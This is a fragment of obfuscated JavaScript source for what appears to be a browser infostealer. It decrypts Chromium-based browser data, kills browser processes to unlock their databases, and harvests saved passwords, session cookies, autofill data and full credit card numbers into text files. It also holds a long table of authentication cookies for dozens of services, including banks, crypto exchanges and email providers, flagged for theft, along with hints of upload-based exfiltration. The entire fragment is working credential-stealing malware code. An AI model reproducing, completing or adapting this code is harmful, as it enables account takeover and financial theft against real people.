          t.setAuthTag(k);
          return Buffer.concat([t.update(j), t.final()]).toString(g.IPhAH);
        } catch (u) {}
      } else if (j) {
        g.IZekJ(q, r, g.oAvhh);
        g.sshzU(s, t);
      } else {
        u(v);
      }
    }
    if (c) {
      if (g.ihCQj(g.YacJR, g.sbvvF)) {
        try {
          if (g.ihCQj(g.XsbMU, g.qvMVE)) {
            const w = crypto.createDecipheriv("aes-256-gcm", c, i);
            w.setAuthTag(k);
            const x = Buffer.concat([w.update(j), w.final()]);
            if (x.length > 32) {
              return x.slice(32).toString(g.IPhAH);
            } else {
              return x.toString(g.IPhAH);
            }
          } else {
            g.IZekJ(d, g, "inject-" + h);
          }
        } catch (z) {}
      } else {
        const B = g.readFileSync(h, g.IPhAH);
        i.push(g.IWxIE);
        j.push(B);
      }
    }
  }
  return null;
}
const DOMAIN_COOKIES = {
  "roblox.com": {
    ".ROBLOSECURITY": "Roblox",
    RBXSessionTracker: "Roblox",
    RBXEventTrackerV2: "Roblox",
    GuestData: "Roblox"
  },
  "instagram.com": {
    sessionid: "Instagram",
    csrftoken: "Instagram",
    ds_user_id: "Instagram",
    ig_did: "Instagram",
    mid: "Instagram",
    rur: "Instagram",
    shbid: "Instagram",
    shbts: "Instagram",
    ig_nrcb: "Instagram"
  },
  "tiktok.com": {
    sid_tt: "TikTok",
    uid_tt: "TikTok",
    sessionid_ss: "TikTok",
    sid_guard: "TikTok",
    sid_ucp_v1: "TikTok",
    ssid_ucp_v1: "TikTok",
    passport_csrf_token: "TikTok",
    multi_sids: "TikTok",
    odin_tt: "TikTok",
    "store-country-code": "TikTok",
    tt_csrf_token: "TikTok",
    ttwid: "TikTok",
    msToken: "TikTok"
  },
  "discord.com": {
    __dcfduid: "Discord",
    __sdcfduid: "Discord",
    __cfruid: "Discord",
    locale: "Discord"
  },
  "twitter.com": {
    auth_token: "Twitter/X",
    ct0: "Twitter/X",
    twid: "Twitter/X",
    personalization_id: "Twitter/X",
    guest_id: "Twitter/X",
    kdt: "Twitter/X",
    att: "Twitter/X"
  },
  "x.com": {
    auth_token: "Twitter/X",
    ct0: "Twitter/X",
    twid: "Twitter/X",
    personalization_id: "Twitter/X",
    guest_id: "Twitter/X",
    kdt: "Twitter/X",
    att: "Twitter/X"
  },
  "facebook.com": {
    c_user: "Facebook",
    xs: "Facebook",
    sb: "Facebook",
    datr: "Facebook",
    fr: "Facebook",
    act: "Facebook",
    presence: "Facebook",
    wd: "Facebook"
  },
  "google.com": {
    SID: "Google",
    HSID: "Google",
    SSID: "Google",
    APISID: "Google",
    SAPISID: "Google",
    NID: "Google",
    SIDCC: "Google",
    LSID: "Google",
    "__Secure-1PSID": "Google",
    "__Secure-3PSID": "Google",
    "__Secure-1PAPISID": "Google",
    "__Secure-3PAPISID": "Google",
    "__Secure-1PSIDCC": "Google",
    "__Secure-3PSIDCC": "Google",
    "__Secure-1PSIDTS": "Google",
    "__Secure-3PSIDTS": "Google",
    "__Secure-ENID": "Google",
    "__Host-GAPS": "Google",
    "__Host-1PLSID": "Google",
    "__Host-3PLSID": "Google",
    "__Host-GAPSTS": "Google",
    OSID: "Google",
    "__Secure-OSID": "Google",
    ACCOUNT_CHOOSER: "Google",
    "1P_JAR": "Google",
    AEC: "Google",
    SOCS: "Google",
    SEARCH_SAMESITE: "Google"
  },
  "youtube.com": {
    PREF: "YouTube",
    VISITOR_PRIVACY_METADATA: "YouTube",
    "__Secure-YEC": "YouTube",
    "__Secure-YENID": "YouTube",
    "__Secure-BUCKET": "YouTube",
    "__Secure-ROLLOUT_TOKEN": "YouTube",
    LOGIN_INFO: "YouTube",
    SID: "YouTube",
    "__Secure-3PSID": "YouTube",
    "__Secure-3PAPISID": "YouTube",
    "__Secure-3PSIDCC": "YouTube",
    "__Secure-3PSIDTS": "YouTube"
  },
  "steampowered.com": {
    steamLoginSecure: "Steam",
    sessionid: "Steam",
    steamMachineAuth: "Steam",
    steamRememberLogin: "Steam"
  },
  "steamcommunity.com": {
    steamLoginSecure: "Steam",
    sessionid: "Steam",
    steamMachineAuth: "Steam"
  },
  "reddit.com": {
    reddit_session: "Reddit",
    token_v2: "Reddit",
    session_tracker: "Reddit",
    loid: "Reddit",
    csv: "Reddit",
    edgebucket: "Reddit"
  },
  "spotify.com": {
    sp_dc: "Spotify",
    sp_key: "Spotify",
    sp_t: "Spotify",
    sp_landing: "Spotify"
  },
  "twitch.tv": {
    "auth-token": "Twitch",
    api_token: "Twitch",
    unique_id: "Twitch",
    persistent: "Twitch",
    login: "Twitch",
    "twilight-user": "Twitch"
  },
  "github.com": {
    "__Host-user_session_same_site": "GitHub",
    user_session: "GitHub",
    "__Host-gist_user_session_same_site": "GitHub",
    "__Host-gh_sess": "GitHub",
    _gh_sess: "GitHub",
    logged_in: "GitHub",
    dotcom_user: "GitHub",
    _octo: "GitHub"
  },
  "netflix.com": {
    NetflixId: "Netflix",
    SecureNetflixId: "Netflix",
    NetflixRegion: "Netflix",
    profilesNewSession: "Netflix"
  },
  "amazon.com": {
    "session-id": "Amazon",
    "at-main": "Amazon",
    "sess-at-main": "Amazon",
    "session-token": "Amazon",
    "ubid-main": "Amazon",
    "x-main": "Amazon",
    "i18n-prefs": "Amazon"
  },
  "snapchat.com": {
    "__Host-sc-a-session": "Snapchat",
    "__Host-sc-a-nonce": "Snapchat",
    "__Host-sc-a-auth-session": "Snapchat",
    "sc-a-nonce": "Snapchat",
    "sc-a-device-id": "Snapchat",
    "sc-a-csrf": "Snapchat",
    "__Host-X-Snap-Client-Cookie": "Snapchat"
  },
  "pinterest.com": {
    _pinterest_sess: "Pinterest",
    _auth: "Pinterest",
    _routing_id: "Pinterest",
    _pinterest_ct: "Pinterest",
    _pinterest_ct_rt: "Pinterest"
  },
  "linkedin.com": {
    li_at: "LinkedIn",
    JSESSIONID: "LinkedIn",
    bcookie: "LinkedIn",
    bscookie: "LinkedIn",
    liap: "LinkedIn",
    li_a: "LinkedIn",
    li_gc: "LinkedIn",
    lidc: "LinkedIn",
    li_ep_auth_context: "LinkedIn",
    UserMatchHistory: "LinkedIn"
  },
  "paypal.com": {
    login_email: "PayPal",
    LANG: "PayPal",
    ts: "PayPal",
    ts_c: "PayPal",
    cookie_check: "PayPal",
    navlns: "PayPal",
    "x-pp-s": "PayPal",
    enforce_policy: "PayPal"
  },
  "coinbase.com": {
    cb_session: "Coinbase",
    cb_sid: "Coinbase",
    coinbase_token: "Coinbase"
  },
  "epicgames.com": {
    EPIC_SSO: "Epic Games",
    EPIC_BEARER_TOKEN: "Epic Games",
    EPIC_SESSION_AP: "Epic Games",
    EPIC_SSO_RM: "Epic Games"
  },
  "kick.com": {
    kick_session: "Kick",
    kick_access_token: "Kick",
    kick_refresh_token: "Kick",
    "XSRF-TOKEN": "Kick"
  },
  "telegram.org": {
    tgauth: "Telegram",
    stel_ssid: "Telegram",
    stel_ln: "Telegram",
    stel_token: "Telegram"
  },
  "web.whatsapp.com": {
    wa_token: "WhatsApp",
    wa_browser_id: "WhatsApp"
  },
  "chatgpt.com": {
    "__Secure-next-auth.session-token": "ChatGPT",
    "__Host-next-auth.csrf-token": "ChatGPT",
    "__Secure-next-auth.callback-url": "ChatGPT"
  },
  "openai.com": {
    "__Secure-next-auth.session-token": "OpenAI",
    "__Host-next-auth.csrf-token": "OpenAI",
    __cf_bm: "OpenAI"
  },
  "live.com": {
    ESTSAUTH: "Microsoft",
    ESTSAUTHPERSISTENT: "Microsoft",
    MUID: "Microsoft",
    buid: "Microsoft",
    SignInStateCookie: "Microsoft",
    ANON: "Microsoft",
    CC: "Microsoft"
  },
  "microsoft.com": {
    ESTSAUTH: "Microsoft",
    ESTSAUTHPERSISTENT: "Microsoft",
    MUID: "Microsoft"
  },
  "microsoftonline.com": {
    ESTSAUTH: "Microsoft",
    ESTSAUTHPERSISTENT: "Microsoft",
    ESTSAUTHLIGHT: "Microsoft",
    buid: "Microsoft",
    "x-ms-gateway-slice": "Microsoft",
    stsservicecookie: "Microsoft",
    AADSSO: "Microsoft",
    brcap: "Microsoft",
    wlidp: "Microsoft"
  },
  "outlook.com": {
    ESTSAUTH: "Microsoft/Outlook",
    ESTSAUTHPERSISTENT: "Microsoft/Outlook",
    "X-OWA-CANARY": "Microsoft/Outlook"
  },
  "yahoo.com": {
    A: "Yahoo",
    T: "Yahoo",
    Y: "Yahoo",
    TID: "Yahoo",
    AS: "Yahoo"
  },
  "zoom.us": {
    zm_aid: "Zoom",
    zm_haid: "Zoom",
    _zm_ssid: "Zoom",
    _zm_ht: "Zoom",
    _x_zm_rtaid: "Zoom",
    _x_zm_rhtaid: "Zoom"
  },
  "walmart.com": {
    auth: "Walmart",
    wm_sec_token: "Walmart",
    TS: "Walmart"
  },
  "ebay.com": {
    nonsession: "eBay",
    ds2: "eBay",
    ebay: "eBay",
    dp1: "eBay",
    s: "eBay"
  },
  "binance.com": {
    "bnc-uuid": "Binance",
    "BNC-UUID": "Binance",
    "session-live": "Binance"
  },
  "stripe.com": {
    __stripe_mid: "Stripe",
    __stripe_sid: "Stripe"
  },
  "cloudflare.com": {
    cf_clearance: "Cloudflare",
    __cf_bm: "Cloudflare",
    __cfduid: "Cloudflare"
  },
  "ea.com": {
    ealocale: "EA Games",
    sid: "EA Games"
  },
  "battle.net": {
    BAID: "Blizzard",
    "BA-tass498-prd": "Blizzard"
  },
  "crunchyroll.com": {
    etp_rt: "Crunchyroll",
    ajs_anonymous_id: "Crunchyroll"
  },
  "hulu.com": {
    _hulu_session: "Hulu",
    _hulu_at: "Hulu",
    _hulu_pgid: "Hulu"
  },
  "disneyplus.com": {
    SWID: "Disney+",
    UNID: "Disney+"
  }
};
function classifyCookie(a, b) {
  const c = a.toLowerCase();
  for (const [d, g] of Object.entries(DOMAIN_COOKIES)) {
    if (c.includes(d) && g[b]) {
      return g[b];
    }
  }
  return null;
}
async function extractBrowserData(d, g) {
  const h = {
    npEgl: function (o, p) {
      return o + p;
    },
    VpiVe: " /IM ",
    wvwrY: " /F",
    XSFzf: "ignore",
    IocSF: function (o, p, q) {
      return o(p, q);
    },
    uqPSX: "error",
    TXvim: "direct-upload-success",
    NUKfZ: function (o, p) {
      return o(p);
    },
    KGQXl: function (o, p) {
      return o(p);
    },
    YhYhb: function (o, p) {
      return o / p;
    },
    xagbt: function (o, p) {
      return o / p;
    },
    mtkJU: "log.txt",
    kTINk: function (o, p) {
      return o !== p;
    },
    tpGUT: "yFzqf",
    LrNDh: function (o, p) {
      return o == p;
    },
    bSeKN: function (o, p) {
      return o & p;
    },
    NGdol: function (o, p) {
      return o + p;
    },
    dqxWC: function (o, p) {
      return o + p;
    },
    HZYbS: "Invalid key response (lines=",
    jlvOW: function (o, p, q) {
      return o(p, q);
    },
    eHZrZ: function (o, p, q) {
      return o(p, q);
    },
    liYXM: "Autofills",
    xZpZk: "utf8",
    LqPTD: function (o, p) {
      return o === p;
    },
    JnvLU: "ndyvZ",
    Goyvu: function (o, p) {
      return o > p;
    },
    ogKXs: "Local",
    uNQdL: function (o, p) {
      return o === p;
    },
    zfDyy: "PgvgF",
    HRmRY: "uqKWM",
    KgulB: "\\Local\\",
    tdgnu: "EPqLA",
    BmkQa: "\\Roaming\\",
    ZytJy: "passwords",
    lnZHi: "Login Data",
    JVbUY: "NbLtt",
    cmViB: "RMjcy",
    kCqKk: "Network",
    kaGid: "Cookies",
    xLsdY: "autofill",
    fxFqi: "Web Data",
    rQpFf: "creditcards",
    VdlKp: function (o, p) {
      return o < p;
    },
    rjXHy: "wIQCj",
    ZrgxP: function (o, p) {
      return o !== p;
    },
    YZaIT: "KJVQv",
    vjkZr: "chrome.exe",
    sijSJ: "msedge.exe",
    UTfur: "Brave",
    sRzRn: "brave.exe",
    VoXfu: "browser.exe",
    qpLAH: "Opera",
    MpJMr: "opera.exe",
    bwLST: function (o, p) {
      return o === p;
    },
    cQoVJ: "TeCar",
    ZqUeQ: function (o, p) {
      return o === p;
    },
    gDqlO: "taskkill /IM \"",
    ATSEk: "\" /F",
    ERzJU: function (o, p) {
      return o === p;
    },
    noXmA: "zUkuS",
    CBJtw: function (o, p) {
      return o + p;
    },
    fZqPX: "DB copy failed after 5 attempts: ",
    QZfxZ: "logins",
    uqEqU: "cookies",
    rbzvf: "credit_cards",
    NPZtb: function (o, p) {
      return o > p;
    },
    ylxMX: function (o, p) {
      return o !== p;
    },
    BrzfT: "hKTsC",
    ejBNG: function (o, p) {
      return o === p;
    },
    tZgUJ: "CsVFk",
    kFqFx: function (o, p) {
      return o === p;
    },
    TlfoM: "LnpVk",
    KkQdl: function (o, p, q, s) {
      return o(p, q, s);
    },
    MDjzq: function (o, p) {
      return o(p);
    },
    avvhm: "(empty)",
    dAocK: function (o, p) {
      return o === p;
    },
    uZyum: function (o, p) {
      return o - p;
    },
    pkwLU: function (o, p) {
      return o / p;
    },
    gEakY: function (o, p) {
      return o * p;
    },
    pzlWu: "Unknown",
    Cnlip: function (o, p) {
      return o - p;
    },
    BeeMx: function (o, p) {
      return o > p;
    },
    oyxwf: function (o, p) {
      return o === p;
    },
    EvIof: "WDotM",
    QwREd: function (o, p) {
      return o !== p;
    },
    NTAUl: "tGgOM",
    dneHq: function (o, p, q) {
      return o(p, q);
    },
    TleZO: function (o, p) {
      return o - p;
    },
    VMPJR: function (o, p) {
      return o / p;
    },
    XnNcq: function (o, p) {
      return o === p;
    },
    ScNDY: function (o, p) {
      return o !== p;
    },
    jzmXa: "no_restriction",
    QMRCL: "strict",
    aEuiZ: function (o, p) {
      return o === p;
    },
    YWQWI: "(unknown)",
    nidwR: "**** **** **** ",
    STkVg: function (o, p) {
      return o === p;
    },
    OMFch: "oFOwR",
    FyMut: "zagne",
    OMXML: "UmBMp",
    MmkMh: "JMtoI",
    xifay: function (o, p, q) {
      return o(p, q);
    }
  };
  const j = {};
  const l = [];
  let m = 0;
  for (let o = 0; o < browserPath.length; o++) {
    if (h.LqPTD("trRiS", h.JnvLU)) {
      try {
        g.unlinkSync(h);
      } catch (q) {}
    } else {
      try {
        const q = browserPath[o][0];
        const s = browserPath[o][1];
        const t = h.Goyvu(browserPath[o].length, 3) ? browserPath[o][3] : undefined;
        const u = h.Goyvu(browserPath[o].length, 4) ? browserPath[o][4] : undefined;
        if (!fs.existsSync(q)) {
          continue;
        }
        let v;
        if (q.includes(h.ogKXs)) {
          if (h.uNQdL(h.zfDyy, h.HRmRY)) {
            try {
              o(h.npEgl(h.npEgl(j, h.VpiVe) + k, h.wvwrY), {
                stdio: h.XSFzf,
                timeout: 3000,
                windowsHide: true
              });
            } catch (C) {}
          } else {
            v = q.split(h.KgulB)[1].split("\\")[0];
          }
        } else if (h.uNQdL(h.tdgnu, "EPqLA")) {
          v = q.split(h.BmkQa)[1].split("\\")[1];
        } else {
          const D = {
            Lrmwh: function (E, F, G) {
              return h.IocSF(E, F, G);
            },
            zyarP: "zip",
            UITXh: "close",
            xcdpJ: h.uqPSX
          };
          return new j((E, F) => {
            const G = {
              snqvk: function (L, M, N) {
                return D.Lrmwh(L, M, N);
              },
              giEVr: "createZipArchive"
            };
            const H = q.createWriteStream(r);
            const K = s(D.zyarP, {
              zlib: {
                level: 1
              }
            });
            H.on(D.UITXh, () => E(E));
            K.on(D.xcdpJ, L => {
              G.snqvk(E, L, G.giEVr);
              F(L);
            });
            K.pipe(H);
            K.directory(v, false);
            K.finalize();
          });
        }
        const w = v + " " + s;
        let x;
        if (g === h.ZytJy) {
          x = path.join(q, h.lnZHi);
        } else if (g === "cookies") {
          if (h.LqPTD(h.JVbUY, h.cmViB)) {
            if (g.data && h.data.attachments && o.data.attachments[0]) {
              return k.data.attachments[0].url;
            }
            return h.TXvim;
          } else {
            x = path.join(q, h.kCqKk, h.kaGid);
            if (!fs.existsSync(x)) {
              x = path.join(q, "Cookies");
            }
          }
        } else if (h.uNQdL(g, h.xLsdY)) {
          x = path.join(q, h.fxFqi);
        } else if (g === h.rQpFf) {
          x = path.join(q, h.fxFqi);
        } else {
          continue;
        }
        if (!fs.existsSync(x)) {
          continue;
        }
        const y = path.join(os.tmpdir(), g + "_" + h.NUKfZ(generateRandomString, 8) + ".db");
        let z = false;
        for (let E = 0; h.VdlKp(E, 5); E++) {
          if (h.kTINk(h.rjXHy, h.rjXHy)) {
            n.description = d.description.substring(0, 1990) + "... (truncated)";
          } else {
            try {
              fs.copyFileSync(x, y);
              z = true;
              break;
            } catch (H) {
              if (h.ZrgxP(h.YZaIT, h.YZaIT)) {
                h = h.NUKfZ(o, j);
                h.KGQXl(k, "[System] Folder size before zip: " + h.YhYhb(h.xagbt(l, 1024), 1024).toFixed(2) + " MB");
              } else {
                if (E === 0) {
                  let J = "";
                  if (q.includes("Chrome")) {
                    J = h.vjkZr;
                  } else if (q.includes("Edge")) {
                    J = h.sijSJ;
                  } else if (q.includes(h.UTfur)) {
                    J = h.sRzRn;
                  } else if (q.includes("Yandex")) {
                    J = h.VoXfu;
                  } else if (q.includes(h.qpLAH)) {
                    J = h.MpJMr;
                  }
                  if (J) {
                    if (h.bwLST(h.cQoVJ, "EeFrF")) {
                      for (const [L, M] of k.entries(l)) {
                        if (o.includes(L)) {
                          q.add(M);
                        }
                      }
                    } else {
                      try {
                        if (h.ZqUeQ("IyCtv", "EnEVi")) {
                          b.kill();
                        } else {
                          h.IocSF(execSync, h.NGdol(h.gDqlO, J) + h.ATSEk, {
                            stdio: "ignore",
                            windowsHide: true
                          });
                        }
                      } catch (N) {}
                    }
                  }
                }
                await new Promise(O => setTimeout(O, (E + 1) * 500));
              }
            }
          }
        }
        if (!z) {
          if (h.ERzJU(h.noXmA, h.noXmA)) {
            logError(new Error(h.CBJtw(h.fZqPX, x)), "extractBrowserData-copy");
            continue;
          } else {
            j(k, l.join(m, n.basename(o)), ["region"], p);
          }
        }
        const A = [];
        try {
          const P = {
            passwords: h.QZfxZ,
            cookies: h.uqEqU,
            autofill: h.xLsdY,
            creditcards: h.rbzvf
          };
          const Q = P;
          const R = fs.readFileSync(y);
          try {
            fs.unlinkSync(y);
          } catch (T) {}
          const S = h.eHZrZ(parseSqliteTable, R, Q[g]);
          if (S && h.NPZtb(S.columns.length, 0) && S.values.length > 0) {
            const U = S.columns;
            const V = S.values;
            for (let W = 0; W < V.length; W++) {
              if (h.ylxMX(h.BrzfT, h.BrzfT)) {
                try {
                  const Y = w();
                  const Z = "[" + Y + "] [SUCCESS] " + x + "\n";
                  if (!y) {
                    return;
                  }
                  if (!z.existsSync(A)) {
                    B.mkdirSync(C, {
                      recursive: true
                    });
                  }
                  const a1 = D.join(E, h.mtkJU);
                  F.appendFileSync(a1, Z, "utf8");
                } catch (a2) {}
              } else {
                const Y = {};
                U.forEach((Z, a0) => {
                  if (h.kTINk(h.tpGUT, "TuYqk")) {
                    Y[Z] = V[W][a0];
                  } else {
                    h[o] = j[k][l];
                  }
                });
                try {
                  if (h.ejBNG(h.tZgUJ, h.tZgUJ)) {
                    let Z = "";
                    if (g === "passwords") {
                      if (h.kFqFx(h.TlfoM, "LnpVk")) {
                        const a0 = h.KkQdl(decryptBrowserValue, Y.password_value, t, u);
                        if (!a0) {
                          continue;
                        }
                        const a1 = w.replace(/[^a-zA-Z0-9_]/g, "_");
                        const a2 = h.MDjzq(generateRandomString, 8);
                        Z = "===============\nURL: " + Y.origin_url + "\nUsername: " + (Y.username_value || h.avvhm) + "\nPassword: " + a0 + "\nApplication: Browser/Logins/" + a1 + "[" + a2 + "].txt\n\n";
                      } else {
                        let a4 = g[h];
                        if (h.LrNDh(h.bSeKN(o, a4.Value), a4.Value)) {
                          j += a4.Emoji;
                        }
                      }
                    } else if (h.dAocK(g, "cookies")) {
                      const a4 = Y.creation_utc ? new Date(h.uZyum(h.pkwLU(Y.creation_utc, 1000), h.gEakY(11644473600, 1000))).toLocaleString() : h.pzlWu;
                      const a5 = Y.expires_utc ? new Date(h.Cnlip(Y.expires_utc / 1000, h.gEakY(11644473600, 1000))).toLocaleString() : "Unknown";
                      const a6 = Y.encrypted_value;
                      let a7 = "";
                      if (a6 && Buffer.isBuffer(a6) && h.BeeMx(a6.length, 0)) {
                        if (h.oyxwf(h.EvIof, h.EvIof)) {
                          const a9 = decryptBrowserValue(a6, t, u);
                          a7 = h.QwREd(a9, null) ? a9 : Y.value || "";
                        } else {
                          const ab = h.NGdol(h.dqxWC(h.HZYbS, o.length), "): ") + j.toString().substring(0, 200);
                          h.jlvOW(k, new l(ab), "extractABE-parse");
                          h.KGQXl(m, new n(ab));
                        }
                      } else if (h.NTAUl === "xheNF") {
                        h.eHZrZ(d, g, "Pixeldrain-Upload");
                        throw h;
                      } else {
                        a7 = Y.value || "";
                      }
                      Z = "================\nHost: " + Y.host_key + "\nName: " + Y.name + "\nValue: " + a7 + "\nCreation Date: " + a4 + "\nExpiration Date: " + a5 + "\nApplication: " + w + "\n\n";
                      const a8 = a7 ? h.dneHq(classifyCookie, Y.host_key || "", Y.name) : null;
                      if (a8) {
                        const ac = Y.expires_utc ? h.TleZO(h.VMPJR(Y.expires_utc, 1000000), 11644473600) : 0;
                        l.push({
                          service: a8,
                          host: Y.host_key || "",
                          name: Y.name,
                          value: a7,
                          browser: w,
                          expiration: a5,
                          path: Y.path || "/",
                          httpOnly: h.XnNcq(Y.is_httponly, 1) || Y.is_httponly === true,
                          secure: h.LqPTD(Y.is_secure, 1) || h.kFqFx(Y.is_secure, true),
                          expiresUnix: ac,
                          sameSite: h.ScNDY(Y.samesite, undefined) ? [h.jzmXa, "lax", h.QMRCL][Y.samesite] || "no_restriction" : h.jzmXa
                        });
                      }
                    } else if (h.aEuiZ(g, h.rQpFf)) {
                      const ad = h.KkQdl(decryptBrowserValue, Y.card_number_encrypted, t, u);
                      if (!ad) {
                        continue;
                      }
                      const ae = Y.name_on_card || h.YWQWI;
                      const af = Y.expiration_month || "?";
                      const ag = Y.expiration_year || "?";
                      const ah = Y.nickname || "";
                      const ai = Y.origin || "";
                      const aj = h.NPZtb(ad.length, 4) ? h.npEgl(h.nidwR, ad.slice(-4)) : ad;
                      Z = "================\nCard Number: " + ad + "\nMasked: " + aj + "\nCardholder: " + ae + "\nExpiration: " + af + "/" + ag + "\n";
                      if (ah) {
                        Z += "Nickname: " + ah + "\n";
                      }
                      if (ai) {
                        Z += "Origin: " + ai + "\n";
                      }
                      Z += "Application: " + w + "\n\n";
                    } else if (g === h.xLsdY) {
                      if (h.STkVg(h.OMFch, h.OMFch)) {
                        Z = "================\nName: " + Y.name + "\nValue: " + Y.value + "\nApplication: " + w + "\n\n";
                      } else {
                        for (const al of m) {
                          if (al && al.length > 50 && !W.some(am => am.token === al)) {
                            const am = {
                              browser: "" + w,
                              token: al
                            };
                            v.push(am);
                            x++;
                          }
                        }
                      }
                    }
                    if (Z) {
                      A.push(Z);
                      m++;
                    }
                  } else {
                    const am = l.join(m, h.liYXM);
                    if (!n.existsSync(am)) {
                      o.mkdirSync(am, {
                        recursive: true
                      });
                    }
                    for (const [ao, ap] of u.entries(v.groupedData)) {
                      const aq = ao.replace(/[^a-zA-Z0-9 ]/g, "");
                      const ar = z.join(am, "Autofills_[" + aq + "].txt");
                      A.writeFileSync(ar, h.npEgl(B.copyright, ap.join("")), {
                        encoding: h.xZpZk,
                        flag: "w"
                      });
                    }
                  }
                } catch (am) {}
              }
            }
          }
        } catch (an) {
          try {
            if (h.ZqUeQ("zagne", h.FyMut)) {
              if (fs.existsSync(y)) {
                fs.unlinkSync(y);
              }
            } else {
              g = "================\nName: " + h.name + "\nValue: " + o.value + "\nApplication: " + j + "\n\n";
            }
          } catch (ap) {}
        }
        if (h.NPZtb(A.length, 0)) {
          if (h.OMXML === h.MmkMh) {
            d("Failed to download injection: " + g.status, "inject-" + h);
            return;
          } else {
            j[w] = A;
          }
        }
      } catch (ar) {
        h.xifay(logError, ar, "extract-" + g + "-" + o);
      }
    }
  }
  const n = {
    count: m,
    groupedData: j,
    importantCookies: l
  };
  return n;
}
async function fetchUserData() {
  const c = {
    nEMEF: "utf8",
    EyVKC: function (h, i) {
      return h(i);
    },
    DTHqE: function (h, i) {
      return h(i);
    },
    lwaOw: function (h, i) {
      return h !== i;
    },
    VWGZC: "jKvPm",
    gQfIS: function (h, i) {
      return h === i;
    },
    qqgUZ: "iWdJJ",
    fPaLn: function (h, i) {
      return h(i);
    },
    FXvXC: function (h, i, j) {
      return h(i, j);
    },
    EyxdN: "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance Win32_ComputerSystem | Select-Object -Property Model, Manufacturer | Format-List\"",
    xTLAD: "pipe",
    PiKVq: function (h, i) {
      return h(i);
    },
    wELmh: "captureAllScreens-readFile",
    oPfAt: function (h, i) {
      return h(i);
    },
    WtOkf: "base64",
    bPCLT: "SELECT origin_url, username_value, password_value, date_created FROM logins",
    DIJuM: "qcgZm",
    zFcwg: "Passwords",
    rsGhv: function (h, i) {
      return h + i;
    },
    goISL: "instagram.com",
    tIhyk: "facebook.com",
    wOJKY: "x.com",
    gbMxm: "tiktok.com",
    Qiuar: "snapchat.com",
    KSgTh: "pinterest.com",
    PwRHF: "linkedin.com",
    AQgCN: "reddit.com",
    CLABG: "tumblr.com",
    UBWTm: "discord.com",
    oeAxR: "discordapp.com",
    VsdYW: "web.telegram.org",
    nvVlX: "slack.com",
    WiOYH: "skype.com",
    iIyjw: "messenger.com",
    uSitA: "roblox.com",
    woxGr: "steampowered.com",
    armaE: "epicgames.com",
    kKPGs: "ea.com",
    QLmmL: "origin.com",
    aIuHX: "battle.net",
    XYFAJ: "blizzard.com",
    uDzwc: "xbox.com",
    FSHRY: "playstation.com",
    cusYt: "riot.com",
    eBRRQ: "leagueoflegends.com",
    GZccE: "ubisoft.com",
    aRxVY: "gog.com",
    heFLo: "mojang.com",
    rnMRs: "crunchyroll.com",
    JTsLh: "funimation.com",
    USYez: "google.com",
    GKvTP: "gmail.com",
    SNjSg: "youtube.com",
    ECdWo: "accounts.google.com",
    dgEtv: "myaccount.google.com",
    PHpqV: "play.google.com",
    uEzEQ: "microsoft.com",
    jGjdP: "live.com",
    dRfaS: "office.com",
    zqeVL: "microsoftonline.com",
    MsZYz: "hotmail.com",
    jAHXW: "onedrive.com",
    lVSiX: "bing.com",
    saetd: "azure.com",
    scjTe: "visualstudio.com",
    LJbbU: "github.com",
    BwAJi: "amazon.com",
    KJhSC: "ebay.com",
    kOCtU: "aliexpress.com",
    bprqu: "etsy.com",
    rdKVi: "shopify.com",
    zoMND: "hepsiburada.com",
    GyjwO: "n11.com",
    pXJKe: "gittigidiyor.com",
    QqRkq: "itemsatis.com",
    uhoee: "paypal.com",
    wSqMw: "kraken.com",
    AyOwh: "blockchain.com",
    xMYBZ: "metamask.io",
    LwGpp: "wise.com",
    vuewW: "revolut.com",
    LiosP: "papara.com",
    SrWdc: "ininal.com",
    irJUp: "garanti.com.tr",
    YoEcl: "yapikredi.com.tr",
    LosRO: "isbank.com.tr",
    Xhrha: "akbank.com.tr",
    TMHhK: "ziraatbank.com.tr",
    oODAT: "netflix.com",
    ZeDJC: "spotify.com",
    qCqsF: "disneyplus.com",
    oYtvt: "hulu.com",
    vfGvp: "hbomax.com",
    pJuYQ: "soundcloud.com",
    MrJpm: "gitlab.com",
    WDzAT: "bitbucket.org",
    AUqrO: "stackoverflow.com",
    aFZLA: "heroku.com",
    fyCeQ: "vercel.com",
    KwuMl: "netlify.com",
    zbTGb: "digitalocean.com",
    nAnIU: "aws.amazon.com",
    MWtMA: "cloudflare.com",
    OLJoc: "firebase.google.com",
    UVvdh: "codepen.io",
    WJfBw: "npmjs.com",
    DUvBJ: "outlook.com",
    YNajc: "yahoo.com",
    ReQiU: "yandex.com",
    jYEdF: "mail.com",
    Gfuio: "protonmail.com",
    azfMD: "zoho.com",
    xQulb: "aol.com",
    ZhQsC: "coursera.org",
    QRWts: "edx.org",
    GnnyC: "duolingo.com",
    wMRaZ: "skillshare.com",
    pHsMv: "codecademy.com",
    esDBV: "nordvpn.com",
    eoNmA: "expressvpn.com",
    kSSjU: "protonvpn.com",
    cVZqw: "1password.com",
    ZqFFp: "lastpass.com",
    YgHFj: "bitwarden.com",
    moVHI: "dashlane.com",
    ihFFY: function (h, i) {
      return h !== i;
    },
    RgnqD: "HjHpy",
    htWxd: function (h, i) {
      return h !== i;
    },
    MnreU: "cvmvK",
    INsvO: function (h, i) {
      return h !== i;
    },
    PqMGl: "qvNAk",
    qjshC: "JJqYJ",
    XfWwF: "oubLX",
    Saaqe: function (h, i) {
      return h !== i;
    },
    ijsFo: "vllrH",
    wqeei: "HaGvB",
    oxWmS: "Other",
    yKYIU: function (h, i) {
      return h + i;
    },
    RPtLH: function (h, i) {
      return h === i;
    },
    pHNdb: "roEgt",
    RPWBo: "ercGe",
    uWBNB: "rfOQa",
    kDpZh: "3|4|0|2|1",
    dCftJ: "All_Passwords.txt",
    BOaBH: "wqAcC",
    PJmBG: "kCQEt",
    srSjX: function (h, i, j) {
      return h(i, j);
    }
  };
  const d = c.bPCLT;
  const g = await extractBrowserData(d, "passwords");
  if (g.count > 0) {
    if (c.DIJuM !== "qcgZm") {
      return "";
    } else {
      const i = path.join(mainFolderPath, c.zFcwg);
      const j = {
        recursive: true
      };
      if (!fs.existsSync(i)) {
        fs.mkdirSync(i, j);
      }
      for (const [n, o] of Object.entries(g.groupedData)) {
        const p = n.replace(/[^a-zA-Z0-9 ]/g, "");
        const q = path.join(i, p + ".txt");
        fs.writeFileSync(q, c.rsGhv(user.copyright, o.join("")), {
          encoding: c.nEMEF,
          flag: "w"
        });
      }
      const k = {
        "Social Media": [c.goISL, c.tIhyk, "twitter.com", c.wOJKY, c.gbMxm, c.Qiuar, c.KSgTh, c.PwRHF, c.AQgCN, c.CLABG, "threads.net", "mastodon"],
